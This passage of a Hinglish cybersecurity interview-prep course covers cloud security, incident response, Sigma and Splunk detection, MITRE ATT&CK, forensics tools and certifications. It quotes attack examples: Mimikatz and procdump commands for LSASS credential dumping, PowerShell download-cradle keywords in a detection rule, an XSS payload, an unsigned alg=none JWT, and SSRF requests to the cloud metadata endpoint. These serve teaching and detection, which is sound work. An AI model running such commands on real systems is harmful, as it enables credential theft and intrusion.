# Scan Git repo
trivy repo https://github.com/example/vulnerable-app

# Continuous monitoring in CI/CD
trivy image --exit-code 1 --severity CRITICAL myapp:latest
```

**Common Interview Gotcha:**
Trivy vs Snyk vs Clair — Trivy is open-source, fast, no internet required. Snyk needs internet, has commercial features. Clair is Red Hat's scanner.

### Chapter 6: Interview Q&A

**Q1: Shared Responsibility Model mein IaaS vs SaaS difference kya hai?**
- IaaS: Customer manages OS, runtime, app, data. Provider manages hardware + hypervisor
- SaaS: Customer manages only data + user access. Provider manages everything else
- IaaS = rented server | SaaS = ready-made product

**Q2: S3 bucket public access prevent kaise karein?**
- S3 Block Public Access at account level (4 settings all enabled)
- Bucket policy: Explicit deny for `Principal: *` with `NotAction` approach
- Regular audits via S3 Scanner or AWS Config rules
- Least privilege: Sirf wahi actions allow karo jo needed hain

**Q3: Kubernetes RBAC mein Role vs ClusterRole mein difference?**
- Role: Namespace-scoped — specific namespace ke resources ke liye
- ClusterRole: Cluster-scoped — across namespaces, nodes, PVs, etc.
- Use Role until you absolutely need ClusterScope

**Q4: IMDSv2 ko SSRF se bachane ka mechanism kya hai?**
- Token-based: PUT request pe token milta hai, token ke bina metadata access nahi
- TTL-bound: Token limited time ke liye valid hai (1-21600 seconds)
- Source IP restricted: Token only from local EC2
- SSRF: Typically GET-based — v2 ke saath PUT bhi karna padta hai

**Q5: AWS IAM Policy evaluation ka exact logic kya hai?**
- All policies evaluated together (identity-based + resource-based + SCP + boundary)
- Default: Implicit Deny (kuch allow nahi hai toh access nahi)
- Explicit Allow: Koi policy allow kare toh allow
- Explicit Deny: Koi policy deny kare toh override sab allow ko
- SCP: Organization level pe boundaries set karta hai

**Q6: Container security mein run-as-non-root kyun important hai?**
- Root in container = root on host (if container escape happens)
- Privilege escalation vulnerability koi milti hai toh full system compromise
- Kubernetes default — root user chalega unless explicitly restricted
- Always: USER directive in Dockerfile + securityContext in pod spec

---

## Chapter 7: Incident Response

### IR Lifecycle (NIST)
```
Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned
```

### Digital Forensics Process
1. **Acquisition** — Create forensically sound image (dd)
2. **Preservation** — Hash, chain of custody
3. **Analysis** — File system, memory, logs
4. **Reporting** — Findings, timeline, evidence

### Malware Analysis Approaches
```
Static Analysis: Examine file without executing
  - Strings, PE structure, hash lookup (VirusTotal)
  - Disassembly (IDA Pro, Ghidra)
  
Dynamic Analysis: Execute in sandbox
  - Process monitor, network traffic, registry changes
  - Cuckoo Sandbox, Any.Run

Memory Analysis: Analyze RAM dump
  - Volatility, Rekall
  - Detect process injection, hidden connections
```

### Threat Hunting Hypothesis Examples
```
H1: "A user downloaded a file from an unknown domain"
H2: "Anomalous PowerShell execution in non-admin hours"
H3: "Data exfiltration through DNS tunneling"
H4: "Lateral movement using pass-the-hash"
```

### Detection Engineering Methodology

Detection engineering ka kaam hai aise detections build karna jo real threats identify kare aur false positives minimize kare.

**IOC-based Detection (Indicator of Compromise)**
Known malicious artifacts ko detect karta hai — file hash, IP, domain, registry key.
```
Pros: Low false positives, easy to implement
Cons: Only known threats, easily evaded (attacker IP change kar sakta hai)
Example: Alert on known malware hash from VirusTotal
```

**Behavior-based Detection (UEBA)**
Normal behavior ka baseline banao, jo usse deviate ho wo flag karo.
```
Pros: Detects unknown threats, zero-day bhi catch ho sakta hai
Cons: Higher false positives, requires baseline learning period
Example: User suddenly downloads 100GB — user normally 1GB/day
```

**Sigma Rules — Portable Detection Format**
Sigma is a generic signature format for log events — SIEM-agnostic.
```yaml
title: Suspicious PowerShell Download
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - 'IEX'
      - 'Invoke-Expression'
      - 'DownloadString'
  condition: selection
```

**Detection Engineering Maturity Model:**
- Level 1: Manual alert triage, no detection rules
- Level 2: Basic IOC-based detections (file hashes, IPs)
- Level 3: Behavior-based rules with SIEM correlation
- Level 4: Automated response (SOAR), threat intel integration
- Level 5: Machine learning, predictive detection

### Splunk SPL Queries for Investigations

**Failed Logins Investigation:**
```spl
index=windows EventCode=4625
| stats count by Account_Name, Source_Network_Address, Workstation_Name
| where count > 10
| sort - count
```

**Process Creation with PowerShell:**
```spl
index=windows EventCode=4688
| search New_Process_Name=powershell.exe
| rex field=CommandLine "(?<script>[-\w]+\.ps1)"
| stats count by User_Name, CommandLine, ComputerName
```

**Network Connections by Process:**
```spl
index=windows EventCode=5156
| search DestPort=443 OR DestPort=80
| stats count by Application, DestAddress, DestPort, User
| sort - count
```

**DNS Queries to Suspicious Domains:**
```spl
index=dns query=*.xyz OR query=*.tk OR query=*.ml
| stats count by query, src_ip
| eval entropy=len(query) - len(replace(query, "([a-zA-Z0-9])\1+", "\1"))
| where entropy > 30
```

### MITRE ATT&CK Framework — 5 Key Techniques

MITRE ATT&CK ek knowledge base hai adversary TTPs ka. Detection teams iska use karte hain apne controls map karne ke liye.

**T1059.001 — Command and Scripting Interpreter: PowerShell**
- Description: Attacker PowerShell use karta hai code execute karne ke liye
- Common Usage: Download cradle (IEX (New-Object...)), encoded commands, AMSI bypass
- Detection: Event ID 4688 with CommandLine containing `-EncodedCommand`, script block logging (4104), pipeline execution
- Mitigation: Constrained Language Mode, AppLocker, AMSI enable

**T1078 — Valid Accounts**
- Description: Legitimate credentials use karke access lena
- Common Usage: Stolen passwords, domain account abuse, service account hijacking
- Detection: Failed logins (4625) + successful login (4624) in short span, anomalous login time/location
- Mitigation: MFA enable karo, rotate service account passwords, monitor unusual logon events

**T1566 — Phishing**
- Description: Social engineering through email to deliver malware or steal credentials
- Common Usage: Malicious attachment, credential harvesting link, business email compromise
- Detection: Email gateway logs (SPF/DKIM fail), user-reported phishing, URL click analysis
- Mitigation: SPF/DKIM/DMARC implement, email filtering, user awareness training

**T1003 — OS Credential Dumping**
- Description: LSASS memory, SAM database, or NTDS.dit se credentials extract karna
- Common Usage: Mimikatz (`sekurlsa::logonpasswords`), `procdump64.exe -ma lsass.exe`, volume shadow copy
- Detection: Process access to LSASS (Event 4663 with access mask 0x410), loading suspicious DLLs, unexpected `procdump`/`mimikatz` execution
- Mitigation: Credential Guard enable, LSASS protection, restrict debug privilege

**T1053 — Scheduled Task/Job**
- Description: Task scheduler ka use karke persistence ya execution
- Common Usage: At (Windows), Launchd (macOS), Systemd timers (Linux), cron jobs
- Detection: Event ID 4698 (scheduled task created), Event ID 106 (task triggered), check for tasks in suspicious paths
- Mitigation: Regular audit of scheduled tasks, restrict who can create tasks

### Cyber Kill Chain vs MITRE ATT&CK vs Unified Kill Chain

| Framework | Type | Scope | Best For |
|-----------|------|-------|----------|
| **Cyber Kill Chain** (Lockheed Martin) | Linear, 7 steps | Network intrusion perspective | Quick incident triage, common attack tracking |
| **MITRE ATT&CK** | Matrix, non-linear | Full adversary behavior | Detection engineering, gap analysis, threat intel mapping |
| **Unified Kill Chain** | 18 phases, 3 cycles | Complete attack lifecycle | Advanced persistent threats, multi-stage attacks |

**Cyber Kill Chain (7 steps):**
```
Recon → Weaponization → Delivery → Exploitation → Installation → C2 → Actions on Objectives
```
- Simple and easy to communicate to management
- But too linear — doesn't account for multiple attack paths

**MITRE ATT&CK (14 tactics, hundreds of techniques):**
```
Reconnaissance → Resource Development → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Command and Control → Exfiltration → Impact
```
- More granular — every step documented with real adversary examples
- Detection teams map controls to specific techniques
- Use for: Purple team exercises, detection rule prioritization

**Unified Kill Chain (18 phases, 3 cycles):**
```
Cycle 1 (In): Initial Foothold — Recon, Weaponization, Delivery, Exploit, Persist, Defense Evasion
Cycle 2 (Through): Network Propagation — Pivot, Discover, Privilege Escalate, Execute, Credential Access, Lateral Movement
Cycle 3 (Out): Action on Objectives — Collect, Exfiltrate, Impact, Objectives
```
- Comprehensive — covers modern attack chains better
- Useful for complex breach investigations

### Forensics Artifact Timeline

Har artifact kuch specific batata hai:

| Artifact | What It Reveals | Windows Location |
|----------|----------------|-----------------|
| **Prefetch Files** | Application execution history, run count, timestamps | `C:\Windows\Prefetch\*.pf` |
| **Jump Lists** | Recently accessed files, program execution | `%APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations` |
| **AmCache** | Application execution and installation evidence | `C:\Windows\AppCompat\Programs\Amcache.hve` |
| **USN Journal** | All file changes — full timeline | `$UsnJrnl` on NTFS volume |
| **Event Logs** | System, security, application activity | `C:\Windows\System32\winevt\Logs\*.evtx` |
| **Registry** | User activity, MRU lists, USB devices | `C:\Windows\System32\config\` (hives) |
| **MFT** | All files including deleted (metadata) | `$MFT` on NTFS volume |
| **Browser History** | Sites visited, downloads, search queries | `%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History` |
| **Memory (RAM)** | Running processes, network connections, injected code | Physical memory dump file |
| **Pagefile / Swap** | Data paged from memory to disk | `C:\pagefile.sys` |

**A typical forensic timeline analysis:**
```
08:00 — User logged in (Event 4624)
08:05 — USB connected (setupapi.dev.log)
08:10 — File copied via explorer (Prefetch + USN Journal)
08:15 — Malicious .exe executed (Prefetch + Event 4688)
08:16 — Network connection to external IP (Event 5156)
08:20 — LSASS accessed (Sysmon Event 10 — possible credential dumping)
08:25 — User logged out (Event 4634)
```

### DFIR Tools — Detailed Usage

**Volatility — Memory Analysis**
```bash
# Identify memory profile
volatility -f memory.dump imageinfo

# List active processes
volatility -f memory.dump --profile=Win10x64 pslist

# Show network connections
volatility -f memory.dump --profile=Win10x64 netscan

# Dump process memory
volatility -f memory.dump --profile=Win10x64 memdump -p 1234 -D output/

# Check for cmd.exe execution
volatility -f memory.dump --profile=Win10x64 cmdline

# Detect injected code (hollowing/reflective)
volatility -f memory.dump --profile=Win10x64 malfind

# Extract registry hives from memory
volatility -f memory.dump --profile=Win10x64 hivelist
```

**Autopsy / Sleuth Kit — Disk Forensics**
```bash
# Examine file system
fls -r /dev/sda1 > file_list.txt

# Recover deleted files
icat /dev/sda1 23456 > recovered_file.txt

# Timeline analysis
fls -m / -r /dev/sda1 > body_file.txt
mactime -b body_file.txt -d > timeline.csv
```

### Chapter 7: Interview Q&A

**Q1: Detection engineering mein IOC vs IOA mein kya difference hai?**
- IOC (Indicator of Compromise): Known bad artifact — hash, IP, domain (past-focused)
- IOA (Indicator of Attack): Suspicious behavior — unusual process chain, anomalous login (present-focused)
- Example: IOC = "file.exe hash XYZ seen on VirusTotal" | IOA = "PowerShell downloading .exe from pastebin"

**Q2: MITRE ATT&CK framework ka practical use kya hai?**
- Detection gap analysis: Check kaun se techniques ke liye detection nahi hai
- Threat intel mapping: Jo threat actor aa raha hai, uske TTPs pe detection banani hai
- Purple team exercise: ATT&CK technique select karo, test karo, result document karo
- Measurement: "Our SOC covers 75% of Enterprise ATT&CK matrix"

**Q3: Phishing investigation mein email headers kyun important hain?**
- SPF check: Return-Path domain = authorized sender list mein hai?
- DKIM: Email signed hai? Domain match karta hai?
- DMARC: Alignment policy fail ya pass?
- Received headers: Trace original sender IP (hop-by-hop)
- Message-ID: Unique ID, correlation ke liye useful

**Q4: Memory forensics mein legit process vs malicious process kaise differentiate karo?**
- Process tree: Legit process ka parent expected hota hai (winlogon → explorer → chrome)
- Hidden processes: pslist shows but psscan shows more (hidden via DKOM)
- DLLs loaded: Unsigned DLLs in legitimate processes
- Handles: Suspicious file handles, registry handles
- Network connections: Process connecting to known-bad IP

**Q5: Ransomware detection ke liye kaun se logs most important hain?**
- Process creation (4688): Unexpected encryptors, renaming files
- File system changes (4663): Mass file modifications with .encrypted extension
- Network connections (5156): C2 beaconing, TOR exit nodes
- Windows Defender logs (WMi): Malware detected alerts
- Sysmon Event 11 (FileCreate): New .exe/.dll creation in unusual locations

---

## Chapter 8: Practical Labs & Tools

### Practice Platforms
```
TryHackMe — Beginner to advanced rooms
HackTheBox — Real-world machines
PortSwigger Labs — Web security focus
PentesterLab — Web + network security
```

### Essential Toolset
```
Scanning:     Nmap, masscan, RustScan
Web:          Burp Suite, OWASP ZAP, nikto, sqlmap
Crypto:       HashCat, John the Ripper, CyberChef
Exploitation: Metasploit, Empire, BloodHound
Network:      Wireshark, tcpdump, Zeek
OSINT:        theHarvester, Shodan, Maltego
Mobile:       MobSF, APKTool, Frida
Cloud:        Pacu, ScoutSuite, Prowler
```

---

## Cyber Security Interview Preparation

### Top 20 Interview Questions by Category

#### Network Security (5 Questions)

**Q1: Firewall ke types batayein?**
- Packet Filtering Firewall — IP, port, protocol ke based pe filter karta hai
- Stateful Inspection Firewall — Connection state track karta hai, port random nahi chahiye
- Application Layer Firewall (WAF) — HTTP/HTTPS traffic inspect karta hai, SQLi/XSS block
- Next-Gen Firewall — IDS/IPS, SSL inspection, threat intelligence sab integrated

**Q2: IDS vs IPS mein kya difference hai?**
- IDS: Monitor karta hai + alert karta hai (passive detection)
- IPS: Monitor + block karta hai in real-time (active prevention)
- Analogy: IDS = CCTV camera, IPS = Security guard jo turant rokta hai
- Placement: IDS usually out-of-band, IPS inline

**Q3: Man-in-the-Middle attack se kaise bachein?**
- TLS/SSL use karo — end-to-end encryption compulsory
- Certificate pinning — specific CA certificate expect karo, random CA accept na karo
- DNSSEC — DNS spoofing se bachata hai
- HSTS header — browser ko force karta hai sirf HTTPS use karne
- Mutual TLS — dono side certificate se verify ho

**Q4: SYN Flood attack kaise kaam karta hai? Mitigation?**
- Attacker bohot saare TCP SYN packets bhejta hai bina ACK complete kiye
- Server ka connection queue (backlog) full ho jata hai
- Legitimate users connect nahi kar paate — DoS condition
- Mitigation: SYN cookies enable karo, rate limiting, decrease timeout, CDN use karo

**Q5: VLAN hopping kya hai?**
- Attacker ek VLAN se doosre VLAN mein network jump karta hai
- Double tagging: 802.1Q double tag bhejke second switch pe pahunch jaana
- Switch spoofing: DTP negotiate karke trunk port access lena
- Mitigation: Disable DTP, use dedicated VLAN IDs, native VLAN change karo

#### Web Security (5 Questions)

**Q6: SQL injection se bachne ke 3 tareeke batao.**
- Parameterized queries / prepared statements — SQL code aur data alag ho
- Input validation — allow-list approach use karo (deny-list nahi)
- Stored procedures — but sahi se implement karo, tab bhi vulnerable ho sakta hai
- WAF — additional layer of defense, but primary nahi

**Q7: XSS ke 3 types explain karo with example.**
- Reflected XSS: Input immediate response mein reflect hota hai (search mein `<script>alert(1)</script>`)
- Stored XSS: Malicious script DB mein store hoti hai, har visitor trigger kare (comment box mein code daal diya)
- DOM-based XSS: Client-side JavaScript vulnerable hai, server data kabhi nahi dekhta (URL fragment se data leke innerHTML mein daal diya)

**Q8: CSRF token kaise kaam karta hai?**
- Server unique unpredictable token generate kare (random, per-session or per-request)
- Form submit karte waqt same token include karo (hidden field or header)
- Server verify kare ki received token session ke token se match hai
- Token should be cryptographically random, tied to user session, expire on logout
- SameSite=Strict/Lax cookie attribute bhi help karta hai

**Q9: SSRF ka real-world impact kya hai? Explain.**
- Cloud metadata (169.254.169.254) access karke IAM credentials steal
- Internal services scan (localhost ports, internal APIs)
- File read via hosted services (file:// protocol)
- Internal network mapping — usual security controls bypass ho jaate hain
- Mitigation: Block private IP ranges in outbound, allowlist domains, disable unnecessary redirect

**Q10: Broken Access Control ka example do with IDOR.**
- User A apna ID change karke User B ka data access kar sakta hai
- Vulnerable code: `GET /api/invoice/123` sirf ID value check karta hai, ownership nahi
- Example: Bank API mein `account_id` change karke kisi aur ka transaction history dekhna
- Mitigation: Server-side authorization check — `if resource.owner_id != current_user.id: deny`

#### Cryptography (5 Questions)

**Q11: Hashing vs Encryption mein difference explain karo.**
- Hashing: One-way function, reverse possible nahi, fixed output length, integrity verification ke liye
- Encryption: Two-way (decrypt possible), variable input = same length output, confidentiality ke liye
- Examples: Hashing = SHA-256, bcrypt | Encryption = AES (symmetric), RSA (asymmetric)
- Password storage: HASH karo (salt ke saath), encrypt nahi (kyunki decrypt ho sakta hai)

**Q12: Symmetric vs Asymmetric encryption comparison?**
- Symmetric: Same key for encrypt/decrypt — fast (GBps speed), key distribution problem
- Asymmetric: Public/Private key pair — slow (MBps), no key distribution issue
- Real-life: TLS mein asymmetric use hota hai key exchange ke liye, symmetric actual data encrypt karne ke liye
- Symmetric algorithm: AES-256 (gold standard) | Asymmetric: RSA-4096, ECC (curve25519)

**Q13: JWT mein alg=none attack kya hai?**
- JWT header mein attacker `"alg":"none"` set kar deta hai
- Vulnerable servers signature check bypass kar dete hain — full trust
- `eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4ifQ.` — koi signature nahi
- Mitigation: Server pe "none" algorithm disable karo, always verify signature, use RS256/ES256

**Q14: Diffie-Hellman key exchange simple mein samjhao.**
- Two parties public channel pe secret key share kar sakte hain bina kisi pre-shared secret ke
- Mathematics: `(g^a mod p)^b mod p = (g^b mod p)^a mod p`
- Alice sends `g^a mod p`, Bob sends `g^b mod p`, dono calculate karte hain `g^(a*b) mod p`
- Man-in-the-middle attack possible (no authentication) — isliye TLS mein signatures bhi hote hain

**Q15: Password store karne ka best practice kya hai?**
- bcrypt (cost factor 12+), argon2id, or PBKDF2
- Always use salt — unique random value per password
- Never use MD5, SHA1, SHA256 for passwords (fast hashes — easy to bruteforce)
- Pepper bhi add karo — application-level secret, code mein store
- Avoid: Base64 encoding (not hashing), multiple cheap hashing rounds, unsalted hashes

#### Incident Response (3 Questions)

**Q16: Incident Response lifecycle kya hai? Steps explain karo.**
- Preparation: Playbooks ready, tools installed, team trained
- Detection: Log analysis, alerts, user reports se identify karo
- Containment: Short-term (disable account, block IP) + Long-term (patch, segment)
- Eradication: Malware remove karo, backdoor close karo, compromised accounts reset
- Recovery: Services restore karo from clean backup, monitor for re-infection
- Lessons Learned: Post-mortem, improvement areas, documentation update

**Q17: Phishing incident handle karne ka process kya hai?**
- User report ke email headers analyze karo (SPF, DKIM, DMARC fail?)
- Determine scope — kaun kaun click kar chuka hai? Mailbox log check karo
- Credentials change karo affected users ke immediately
- Block sender domain, IPs, URLs in email gateway
- Check mail flow rules for persistence (attacker forwarding rule bana sakta hai)
- User awareness training — "Click nahi karna, report karna"

**Q18: Ransomware detection ke immediate steps kya hain?**
- Isolate affected system from network — pull the plug physically
- Do NOT pay ransom — no guarantee of recovery
- Identify variant — file extension, ransom note content, encryption pattern
- Check for offline/immutable backups (last known good backup)
- Contain lateral movement — disable admin accounts, block SMB/RDP
- Preserve evidence — RAM dump, encrypted files sample, logs
- Engage law enforcement — CERT-IN, FBI, or local cyber crime

#### Cloud Security (2 Questions)

**Q19: Shared Responsibility Model explain karo.**
- AWS: Security OF the cloud — AWS responsible for physical security, hardware, network infra
- Customer: Security IN the cloud — data classification, IAM, network config, encryption
- IaaS: Customer manages everything above OS (EC2) — most responsibility
- PaaS: Customer manages app + data (RDS, Elastic Beanstalk) — less OS management
- SaaS: Customer manages data + user access only (Office 365) — least responsibility
- Common mistake: Log lagao ki "AWS ne encrypt kar diya hoga" — customer ka responsibility hai data encryption

**Q20: IMDSv1 vs IMDSv2 mein difference? SSRF defense kaise hoti hai?**
- IMDSv1: Direct GET request se metadata access — `curl http://169.254.169.254/latest/meta-data/`
- IMDSv2: Session-oriented — first PUT request se token, then GET with token
- v1 vulnerable to SSRF: Attacker `file_get_contents('http://169.254.169.254/')` kar sakta hai
- v2 requires token via PUT + `X-aws-ec2-metadata-token-ttl-seconds` header
- v2 token is tied to source IP — proxy nhi kar sakte
- Best practice: Block IMDSv1, require IMDSv2, use network ACLs to block metadata IP

### Scenario-Based Questions

**Scenario 1: "Website slow ho gayi hai, DDoS suspect ho raha hai. Investigation steps?"**
- Check traffic patterns — sudden spike from specific IP range or region?
- Check CDN/WAF logs — same user-agent pattern, unusual request rate?
- Distinguish: Network-layer DDoS (UDP flood, SYN flood) vs Application-layer (HTTP flood)
- Enable rate limiting and JS challenge (CAPTCHA) for suspicious visitors
- Blacklist offending IPs via WAF, enable geo-blocking if traffic from unexpected region
- Scale up resources temporarily if needed
- For large attacks — use DDoS protection service (Cloudflare, AWS Shield, Akamai)

**Scenario 2: "Production server mein malicious file upload detect hui. Action plan?"**
- Immediately isolate server from network — disable NIC, but do not power off
- Take forensic disk image + RAM dump before any changes
- Check web server access logs — upload time, source IP, user-agent
- Analyze uploaded file — web shell? Reverse shell? Backdoor?
- Check for persistence — cron jobs, systemd services, registry changes
- Check privilege escalation — started as www-data, but root bhi ban gaya?
- Identify root cause — file upload validation nahi thi? Authentication bypass?
- Restore from clean backup only after complete investigation
- Implement: file extension check + content-type validation + content scanning + directory restrictions

**Scenario 3: "S3 bucket se sensitive data leak ho gaya. Remediation plan?"**
- Immediate: Block public access to bucket — emergency ACL change
- Investigate: CloudTrail karo — kaun access kar chuka hai, kab, kahan se (IP), kya data download hua
- Determine root cause: Bucket policy misconfigured? Accidental ACL change? Compromised IAM key?
- Notify affected users if PII/PHI involved — GDPR, DPDP compliance
- Implement: S3 Block Public Access at account level (can't override)
- Implement: S3 Object Lock + default encryption (AES-256 or KMS)
- Implement: Automated compliance checks via AWS Config Rules
- Long-term: Regular S3 audit via S3 Scanner, security baseline in CloudFormation

**Scenario 4: "Ransomware ne file server encrypt kar diya. Complete response?"**
- Isolate affected system — remove from network, disable NIC (physical isolation best)
- Do NOT power off — memory mein IOCs, encryption keys, process list ho sakte hain
- Identify variant by ransom note, file extension (readme.html), encryption algorithm
- Check NoMoreRansom project for free decryption tools
- Identify initial access vector — phishing email? RDP brute-force? Vulnerability exploit?
- Restore from offline backups (NOT attached to network — backup bhi encrypt ho sakta hai)
- Document everything — timeline, affected files, systems, users
- After recovery: Patch the entry-point vulnerability, implement MFA, improve backup strategy
- Train users — "Agar ajeeb email dikhe toh report karo, click nahi"

**Scenario 5: "Insider threat — employee bohot saara data export kar raha hai. Action?"**
- Check DLP alerts — who is accessing or downloading unusual amounts of data
- Check CloudTrail/access logs — after-hours activity, unusual geographic regions
- Check USB device connection logs — external drive connected?
- Check email for external forwarding (data exfiltration via email)
- Review privileged access — is role appropriate for actual job function?
- Verify separation of duties — same person requesting + approving access?
- If confirmed: Isolate user account immediately (disable AD account, revoke cloud access)
- Preserve all logs, email archives, access records for HR/legal investigation

### Certification Overview

**CEH (Certified Ethical Hacker)**
- Focus: Tool-based penetration testing, theoretical coverage
- Covers: Recon, scanning, enumeration, web hacking, mobile, cloud, IoT
- 125 MCQs, 4 hours — multiple-choice style
- Good for: Beginners, SOC roles, government compliance requirements
- Cost: ~$1200 (exam + official training is extra)
- Validity: 3 years, requires 120 ECE credits for renewal
- Practical: CEH Practical exam also available (6 hours, hands-on)

**OSCP (Offensive Security Certified Professional)**
- Focus: Practical hands-on penetration testing — no theory, all action
- Structure: 24-hour exam with 3-5 machines to fully compromise
- Passing: 70 points out of 100 (exam + lab report)
- Covers: Network pentesting, web application attacks, privilege escalation (Linux + Windows), buffer overflow
- Good for: Pentesters, red teamers, security engineers
- Cost: ~$1600 (includes 90 days lab access + one exam attempt)
- Validity: Does not expire (lifetime certification)
- Difficulty: High — but most respected penetration testing cert

**Other Notable Certifications:**
- Security+ (CompTIA): Entry-level, vendor-neutral, foundational security concepts
- CISSP: Managerial certification — 8 domains of security (broad but not deep technically)
- GPEN (SANS): Practical penetration testing with GCIH for incident handling
- CRTP: Active Directory security and attack paths aligned with Certified Red Team Professional
- eJPT (INE): Beginner-friendly practical exam, good for starting in pentesting
- PNPT (TCM Security): Practical exam, AD-heavy, OSINT + external + internal

**Which Certification Should You Choose?**
- Aim: Entry-level SOC role → Security+ → CEH (if required by company)
- Aim: Penetration Tester → eJPT → OSCP (gold standard)
- Aim: Web Security specialist → PortSwigger labs + bug bounty experience
- Aim: Cloud Security → AWS Security + Azure Security certs
- Already experienced pentester → Direct OSCP or CRTP for AD specialization
- Budget constraint: eJPT (~$249) best value, OSCP is expensive but worth it

---

## 📂 Source Content

30 modules of detailed content in `original/Main-Course/Placement-01/11-Cyber-Security/`:

- [Complete Course Index](../original/11-Cyber-Security/CYBER_SECURITY_COMPLETE_INDEX.md) (369 lines — all modules)
- [Master Index](../original/11-Cyber-Security/DETAILED_CONCEPTS/MASTER_INDEX_COMPLETE.md) (610 lines)
- [Security Fundamentals](../original/11-Cyber-Security/Modules/Module_01_Security_Fundamentals/01_Security_Fundamentals.md) (528 lines)
- [OWASP Top 10](../original/11-Cyber-Security/Modules/Module_02_OWASP_Top_10/02_OWASP_Top_10.md) (694 lines)
- [Cryptography](../original/11-Cyber-Security/Modules/Module_03_Cryptography/03_Cryptography_Complete.md)
- [Penetration Testing](../original/11-Cyber-Security/Modules/Module_04_Penetration_Testing/04_Penetration_Testing.md)
- [Secure Coding](../original/11-Cyber-Security/Modules/Module_05_Secure_Coding/05_Secure_Coding.md)
- [Network Security](../original/11-Cyber-Security/Modules/Module_06_Network_Security/06_Network_Security_Complete.md)
- [System Hacking](../original/11-Cyber-Security/Modules/Module_08_System_Hacking/08_System_Hacking_Complete.md)
- [Application Security](../original/11-Cyber-Security/Modules/Module_09_Application_Security/09_Application_Security_Complete.md)
- [Cloud Security](../original/11-Cyber-Security/Modules/Module_10_Cloud_Security/10_Cloud_Security_Complete.md)
- [DevSecOps](../original/11-Cyber-Security/Modules/Module_11_DevSecOps/11_DevSecOps_Complete.md)
- [Incident Response](../original/11-Cyber-Security/Modules/Module_16_Incident_Response/16_Incident_Response_Complete.md)
- [Digital Forensics](../original/11-Cyber-Security/Modules/Module_17_Digital_Forensics/17_Digital_Forensics_Complete.md)
- [Malware Analysis](../original/11-Cyber-Security/Modules/Module_18_Malware_Analysis/18_Malware_Analysis_Complete.md)
- [Threat Hunting](../original/11-Cyber-Security/Modules/Module_19_Threat_Hunting/19_Threat_Hunting_Complete.md)

---

## Notes

<div id="page-notes"></div>
